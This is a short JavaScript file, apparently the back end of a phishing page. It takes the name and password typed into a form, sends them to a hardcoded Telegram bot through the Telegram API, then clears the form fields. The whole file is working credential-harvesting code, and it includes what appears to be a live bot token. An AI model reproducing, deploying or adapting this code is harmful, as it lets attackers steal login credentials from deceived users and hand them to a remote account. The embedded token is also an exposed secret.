//bot token
var telegram_bot_id = "7083927732:AAEJzLYmEo8sEbbd1pVB4s9dKxz6TXEzHyo";
//chat id
var chat_id = 7083927732;
var u_name, password;
var ready = function () {
  u_name = document.getElementById("name").value;
  password = document.getElementById("password").value;
  //   message = document.getElementById("message").value;
  message = "Name: " + u_name + "\npassword: " + password;
};
var sender = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
  });
  document.getElementById("name").value = "";
  document.getElementById("password").value = "";
  //   document.getElementById("message").value = "";
  return false;
};
